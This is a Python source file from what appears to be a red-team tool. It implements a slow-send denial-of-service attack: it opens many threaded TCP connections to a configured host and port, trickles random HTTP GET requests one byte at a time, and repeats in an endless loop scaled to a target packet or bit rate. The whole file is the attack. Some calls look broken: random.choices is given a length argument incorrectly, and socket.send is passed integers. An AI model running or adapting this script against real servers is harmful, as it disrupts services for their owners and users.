import random
import socket
import string
import time
from multiprocessing.pool import ThreadPool

from loguru import logger

from red.config import config


def generate_random_string(length):
    return "".join(random.choices(possible_string_values, length))


possible_string_values = str(string.ascii_letters + string.digits + string.punctuation)
connection_time = 0.5
random_size = 900
payload_length = len(f"GET {generate_random_string(random_size)} HTTP/1.1\r\n\r\n".encode())
pps = payload_length / connection_time
bps = (20 + 20 + 1) * 8 * pps


def connection(_: None):
    sock = socket.socket()
    sock.connect((config.server_host, config.server_port))
    payload = f"GET {generate_random_string(random_size)} HTTP/1.1\r\n\r\n".encode()
    for char in payload:
        sock.send(char)
        time.sleep(connection_time / len(payload))
    sock.close()


def run():
    logger.info(f"Starting with: "
                f"{possible_string_values} "
                f"{connection_time} "
                f"{payload_length} "
                f"{pps} "
                f"{bps} ")
    if config.attack.cli.bps is None:
        threads = int(config.attack.cli.pps / pps)
    else:
        threads = int(config.attack.cli.bps / bps)

    while True:
        with ThreadPool(threads) as pool:
            pool.map(connection, [None] * threads)
            pool.join()
